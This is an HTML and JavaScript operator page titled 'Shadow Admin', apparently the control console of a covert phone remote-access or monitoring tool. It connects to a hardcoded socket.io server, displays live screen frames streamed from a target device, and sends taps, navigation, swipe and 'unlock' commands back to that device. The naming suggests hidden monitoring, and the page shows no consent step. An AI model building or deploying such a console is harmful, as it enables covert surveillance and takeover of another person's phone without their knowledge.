<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Shadow Admin - Live View</title>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>

    <style>
        :root { --bg-color: #000000; --accent: #00ff88; --panel: #111; }

        body {
            margin: 0; background-color: var(--bg-color); color: white;
            font-family: sans-serif; height: 100vh; overflow: hidden;
            display: flex; flex-direction: column; align-items: center;
        }

        /* Status Bar */
        .top-bar {
            width: 100%; padding: 10px 20px; background: var(--panel);
            display: flex; justify-content: space-between; border-bottom: 1px solid #333;
            z-index: 100;
        }

        /* Main Screen Area */
        .screen-box {
            position: relative;
            width: 100%; max-width: 360px; /* Phone width limit */
            height: 100%; flex: 1;
            display: flex; align-items: center; justify-content: center;
            background: #111; border-left: 1px solid #333; border-right: 1px solid #333;
        }

        /* ðŸ”¥ IMAGE FIX: Object-fit contain rakha hai taaki puri screen dikhe */
        #screenStream {
            width: 100%; height: 100%;
            object-fit: contain; 
            z-index: 10;
        }

        /* Message if screen is black */
        .loading-text {
            position: absolute; color: #555; z-index: 1;
        }

        /* Buttons Overlay (Invisible Touch Area for controls) */
        .nav-overlay {
            position: absolute; bottom: 0; width: 100%; height: 60px;
            background: rgba(0,0,0,0.8); display: flex; justify-content: space-around; align-items: center;
            z-index: 20; border-top: 1px solid #333;
        }
        .nav-btn { padding: 15px; font-size: 1.5rem; color: #888; cursor: pointer; }
        .nav-btn:active { color: var(--accent); }

        /* Side Controls (Floating) */
        .fab-controls {
            position: absolute; right: 20px; bottom: 100px;
            display: flex; flex-direction: column; gap: 15px; z-index: 50;
        }
        .fab {
            width: 50px; height: 50px; background: #222; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            border: 1px solid #444; box-shadow: 0 4px 10px black; cursor: pointer;
        }
        .fab:active { background: var(--accent); color: black; }

    </style>
</head>
<body>

    <div class="top-bar">
        <span style="color:var(--accent); font-weight:bold;">SHADOW VIEW</span>
        <span id="fps-counter" style="font-size:12px; color:#555;">FPS: 0</span>
    </div>

    <div class="screen-box">
        <div class="loading-text">Waiting for Image Data...</div>
        
        <img id="screenStream" src="" alt="" onclick="sendClick(event)">
        
        <div class="nav-overlay">
            <div class="nav-btn" onclick="sendCommand('recent')"><i class="fa-regular fa-square"></i></div>
            <div class="nav-btn" onclick="sendCommand('home')"><i class="fa-regular fa-circle"></i></div>
            <div class="nav-btn" onclick="sendCommand('back')"><i class="fa-solid fa-caret-left"></i></div>
        </div>
    </div>

    <div class="fab-controls">
        <div class="fab" onclick="sendCommand('unlock')"><i class="fa-solid fa-power-off"></i></div>
        <div class="fab" onclick="sendCommand('swipe_up')"><i class="fa-solid fa-arrow-up"></i></div>
    </div>

    <script>
        const SERVER_URL = "https://child-v9no.onrender.com"; 
        let socket = null;
        let currentDeviceId = null;
        let lastFrameTime = Date.now();
        let frameCount = 0;

        window.onload = () => {
            const urlParams = new URLSearchParams(window.location.search);
            currentDeviceId = urlParams.get('id');
            if(currentDeviceId) startConnection();
        };

        function startConnection() {
            socket = io(SERVER_URL, { transports: ['websocket', 'polling'] });

            socket.on("connect", () => {
                console.log("Connected");
                socket.emit("join", currentDeviceId);
            });

            // ðŸ”¥ MAGIC FIX: Auto-Detect Image Format
            socket.on("screen-data", (data) => {
                const img = document.getElementById('screenStream');
                
                // FPS Counter (Ye batayega image aa rahi hai ya nahi)
                frameCount++;
                if(frameCount % 10 === 0) {
                    let fps = Math.round(1000 / (Date.now() - lastFrameTime) * 10);
                    document.getElementById('fps-counter').innerText = "Live Packets: " + frameCount;
                    lastFrameTime = Date.now();
                }

                if (!data.image) return;

                // 1. Agar data me pehle se Header hai to waise hi chalao
                if(data.image.startsWith("data:image")) {
                    img.src = data.image;
                } 
                // 2. Agar '/9j/' se shuru hai to JPEG hai
                else if (data.image.startsWith("/9j/")) {
                    img.src = "data:image/jpeg;base64," + data.image;
                }
                // 3. Agar 'UklGR' se shuru hai to WEBP hai
                else if (data.image.startsWith("UklGR")) {
                    img.src = "data:image/webp;base64," + data.image;
                }
                // 4. Fallback (Default to WebP)
                else {
                    img.src = "data:image/webp;base64," + data.image;
                }
            });
        }

        function sendCommand(action) {
            if(!socket) return;
            if(navigator.vibrate) navigator.vibrate(30);
            socket.emit("control-event", { room: currentDeviceId, action: action });
        }

        function sendClick(event) {
            if(!socket) return;
            const img = document.getElementById('screenStream');
            const rect = img.getBoundingClientRect();
            
            // Scaling Logic (Zaruri hai agar phone size alag ho)
            const scaleX = img.naturalWidth / rect.width;
            const scaleY = img.naturalHeight / rect.height;

            const x = (event.clientX - rect.left); // Simple click bhej raha hu
            const y = (event.clientY - rect.top);

            socket.emit("control-event", {
                room: currentDeviceId,
                action: "click",
                x: Math.round(x),
                y: Math.round(y)
            });
        }
    </script>
</body>
</html>
